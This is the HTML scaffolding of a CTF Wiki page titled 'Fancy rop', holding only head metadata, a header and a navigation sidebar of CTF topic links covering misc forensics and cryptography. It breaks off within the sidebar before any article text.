
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="CTF Wiki">
      
      
        <link rel="canonical" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop/">
      
      
        <meta name="author" content="CTF Wiki Team">
      
      <link rel="shortcut icon" href="../../../..">
      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.0.2">
    
    
      
        <title>Fancy rop - CTF Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/main.f1caf91c.min.css">
      
        
        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.3f72e892.min.css">
        
      
    
    
    
      
        
        <link href="https://gstatic.loli.net" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
        <style>body,input{font-family:"Noto Sans",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro",SFMono-Regular,Consolas,Menlo,monospace}</style>
      
    
    
    
      <link rel="stylesheet" href="../../../../_static/css/extra.css">
    
    
      
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="preference" data-md-color-primary="" data-md-color-accent="">
      
        <script>matchMedia("(prefers-color-scheme: dark)").matches&&document.body.setAttribute("data-md-color-scheme","slate")</script>
      
  
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#_1" class="md-skip">
          跳转至
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid" aria-label="Header">
    <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-header-nav__button md-logo" aria-label="CTF Wiki">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3L1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"/></svg>

    </a>
    <label class="md-header-nav__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header-nav__title" data-md-component="header-title">
      
        <div class="md-header-nav__ellipsis">
          <span class="md-header-nav__topic md-ellipsis">
            CTF Wiki
          </span>
          <span class="md-header-nav__topic md-ellipsis">
            
              Fancy rop
            
          </span>
        </div>
      
    </div>
    
      <label class="md-header-nav__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header-nav__source">
        
<a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 GitHub 仓库" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    ctf-wiki/ctf-wiki
  </div>
</a>
      </div>
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-nav__button md-logo" aria-label="CTF Wiki">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3L1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"/></svg>

    </a>
    CTF Wiki
  </label>
  
    <div class="md-nav__source">
      
<a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 GitHub 仓库" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    ctf-wiki/ctf-wiki
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
    
    <label class="md-nav__link" for="nav-1">
      Introduction
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Introduction" data-md-level="1">
      <label class="md-nav__title" for="nav-1">
        <span class="md-nav__icon md-icon"></span>
        Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../.." class="md-nav__link">
      Getting Started
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/history-zh/" class="md-nav__link">
      CTF History
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/mode-zh/" class="md-nav__link">
      Introduction to CTF Competition Form
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/content-zh/" class="md-nav__link">
      CTF Contest Content
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/experience-zh/" class="md-nav__link">
      Offline Attack and Defense Experience Summary
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/cgc-zh/" class="md-nav__link">
      CGC Super Challenge
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/resources-zh/" class="md-nav__link">
      Learning Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
    
    <label class="md-nav__link" for="nav-2">
      Misc
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Misc" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        <span class="md-nav__icon md-icon"></span>
        Misc
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/introduction-zh/" class="md-nav__link">
      Miscellaneous Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/recon-zh/" class="md-nav__link">
      Information Gathering Technology
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
    
    <label class="md-nav__link" for="nav-2-3">
      Code Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Code Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-3">
        <span class="md-nav__icon md-icon"></span>
        Code Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/communication-zh/" class="md-nav__link">
      Commonly Used Coding in the Communication Field
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/computer-zh/" class="md-nav__link">
      Computer Related Coding
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/modern-zh/" class="md-nav__link">
      Commonly Used Encodings in the Real World
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/prefix-zh/" class="md-nav__link">
      Forensic Steganography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5">
    
    <label class="md-nav__link" for="nav-2-5">
      Image Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Image Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-5">
        <span class="md-nav__icon md-icon"></span>
        Image Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/introduction-zh/" class="md-nav__link">
      Introduction to Image Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/png-zh/" class="md-nav__link">
      PNG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/jpg-zh/" class="md-nav__link">
      JPG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/gif-zh/" class="md-nav__link">
      GIF
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6">
    
    <label class="md-nav__link" for="nav-2-6">
      Traffic Packet Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Traffic Packet Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-6">
        <span class="md-nav__icon md-icon"></span>
        Traffic Packet Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/introduction-zh/" class="md-nav__link">
      Introduction to Traffic Packet Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/fix-zh/" class="md-nav__link">
      PCAP File Repairing
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-6-3" type="checkbox" id="nav-2-6-3">
    
    <label class="md-nav__link" for="nav-2-6-3">
      Protocol Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Protocol Analysis" data-md-level="3">
      <label class="md-nav__title" for="nav-2-6-3">
        <span class="md-nav__icon md-icon"></span>
        Protocol Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/README-zh/" class="md-nav__link">
      Overview of Protocol Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/Wireshark-zh/" class="md-nav__link">
      Wireshark
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/HTTP-zh/" class="md-nav__link">
      HTTP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/HTTPS-zh/" class="md-nav__link">
      HTTPS
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/FTP-zh/" class="md-nav__link">
      FTP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/DNS-zh/" class="md-nav__link">
      DNS
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/WIFI-zh/" class="md-nav__link">
      WIFI
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/USB-zh/" class="md-nav__link">
      USB
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/data-zh/" class="md-nav__link">
      Data Extraction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-7" type="checkbox" id="nav-2-7">
    
    <label class="md-nav__link" for="nav-2-7">
      Compressed Package Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Compressed Package Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-7">
        <span class="md-nav__icon md-icon"></span>
        Compressed Package Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/archive/zip-zh/" class="md-nav__link">
      ZIP Format
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/archive/rar-zh/" class="md-nav__link">
      RAR Format
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/audio/introduction-zh/" class="md-nav__link">
      Audio Steganography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-9" type="checkbox" id="nav-2-9">
    
    <label class="md-nav__link" for="nav-2-9">
      Disk Memory Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Disk Memory Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-9">
        <span class="md-nav__icon md-icon"></span>
        Disk Memory Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/disk-memory/introduction-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/disk-memory/problem-zh/" class="md-nav__link">
      Title
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-10" type="checkbox" id="nav-2-10">
    
    <label class="md-nav__link" for="nav-2-10">
      Other
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Other" data-md-level="2">
      <label class="md-nav__title" for="nav-2-10">
        <span class="md-nav__icon md-icon"></span>
        Other
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/other/pyc-zh/" class="md-nav__link">
      pyc File
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      Crypto
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Crypto" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        <span class="md-nav__icon md-icon"></span>
        Crypto
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/introduction-zh/" class="md-nav__link">
      Introduction to Cryptography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
    
    <label class="md-nav__link" for="nav-3-2">
      Basic Mathematics
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Basic Mathematics" data-md-level="2">
      <label class="md-nav__title" for="nav-3-2">
        <span class="md-nav__icon md-icon"></span>
        Basic Mathematics
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/basic/introduction-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
    
    <label class="md-nav__link" for="nav-3-3">
      Classical Cryptography
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Classical Cryptography" data-md-level="2">
      <label class="md-nav__title" for="nav-3-3">
        <span class="md-nav__icon md-icon"></span>
        Classical Cryptography
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/introduction-zh/" class="md-nav__link">
      Introduction to Classical Cryptography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/monoalphabetic-zh/" class="md-nav__link">
      Single table Substitution Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/polyalphabetic-zh/" class="md-nav__link">
      Multi-table Substitution Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/others-zh/" class="md-nav__link">
      Other Types of Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/summary-zh/" class="md-nav__link">
      Summary
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4">
    
    <label class="md-nav__link" for="nav-3-4">
      Stream Cipher
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Stream Cipher" data-md-level="2">
      <label class="md-nav__title" for="nav-3-4">
        <span class="md-nav__icon md-icon"></span>
        Stream Cipher
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/intro-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4-2" type="checkbox" id="nav-3-4-2">
    
    <label class="md-nav__link" for="nav-3-4-2">
      Pseudo Random Number Generator
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Pseudo Random Number Generator" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-2">
        <span class="md-nav__icon md-icon"></span>
        Pseudo Random Number Generator
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/intro-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/csprng-zh/" class="md-nav__link">
      Cryptographic Security Pseudo-random Number Generator
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/problem-zh/" class="md-nav__link">
      Challenge Examples
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4-3" type="checkbox" id="nav-3-4-3">
    
    <label class="md-nav__link" for="nav-3-4-3">
      Linear Congruence Generator
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linear Congruence Generator" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-3">
        <span class="md-nav__icon md-icon"></span>
        Linear Congruence Generator
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/lcg/intro-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/lcg/challenge-zh/" class="md-nav__link">
      Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4-4" type="checkbox" id="nav-3-4-4">
    
    <label class="md-nav__link" for="nav-3-4-4">
      Feedback Shift Register
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Feedback Shift Register" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-4">
        <span class="md-nav__icon md-icon"></span>
        Feedback Shift Register
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/intro-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/lfsr-zh/" class="md-nav__link">
      Linear Feedback Shift Register
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/nfsr-zh/" class="md-nav__link">
      Nonlinear Feedback Shift Register
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4-5" type="checkbox" id="nav-3-4-5">
    
    <label class="md-nav__link" for="nav-3-4-5">
      Special Stream Cipher
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Special Stream Cipher" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-5">
        <span class="md-nav__icon md-icon"></span>
        Special Stream Cipher
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/special/rc4-zh/" class="md-nav__link">
      RC4
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
    
    <label class="md-nav__link" for="nav-3-5">
      Block Cipher
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Block Cipher" data-md-level="2">
      <label class="md-nav__title" for="nav-3-5">
        <span class="md-nav__icon md-icon"></span>
        Block Cipher
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/introduction-zh/" class="md-nav__link">
      Introduction to Block Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/arx-operations-zh/" class="md-nav__link">
      ARX
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/des-zh/" class="md-nav__link">
      DES
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/idea-zh/" class="md-nav__link">
      IDEA
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/aes-zh/" class="md-nav__link">
      AES
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/simon-speck-zh/" class="md-nav__link">
      Simon and Speck
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-5-7" type="checkbox" id="nav-3-5-7">
    
    <label class="md-nav__link" for="nav-3-5-7">
      Group Mode
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Group Mode" data-md-level="3">
      <label class="md-nav__title" for="nav-3-5-7">
        <span class="md-nav__icon md-icon"></span>
        Group Mode
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/introduction-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/padding-zh/" class="md-nav__link">
      Padding Methods
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ecb-zh/" class="md-nav__link">
      ECB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/cbc-zh/" class="md-nav__link">
      CBC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/pcbc-zh/" class="md-nav__link">
      PCBC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/cfb-zh/" class="md-nav__link">
      CFB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ofb-zh/" class="md-nav__link">
      OFB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ctr-zh/" class="md-nav__link">
      CTR
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/padding-oracle-attack-zh/" class="md-nav__link">
      Padding Oracle Attack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-6" type="checkbox" id="nav-3-6">
    
    <label class="md-nav__link" for="nav-3-6">
      Asymmetric Cryptography
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Asymmetric Cryptography" data-md-level="2">
      <label class="md-nav__title" for="nav-3-6">
        <span class="md-nav__icon md-icon"></span>
        Asymmetric Cryptography
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/introduction-zh/" class="md-nav__link">
      Introduction to Asymmetric Cryptography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-6-2" type="checkbox" id="nav-3-6-2">
    
    <label class="md-nav__link" for="nav-3-6-2">
      RSA
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="RSA" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-2">
        <span class="md-nav__icon md-icon"></span>
        RSA
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_theory-zh/" class="md-nav__link">
      RSA Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_module_attack-zh/" class="md-nav__link">
      Modulo-related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
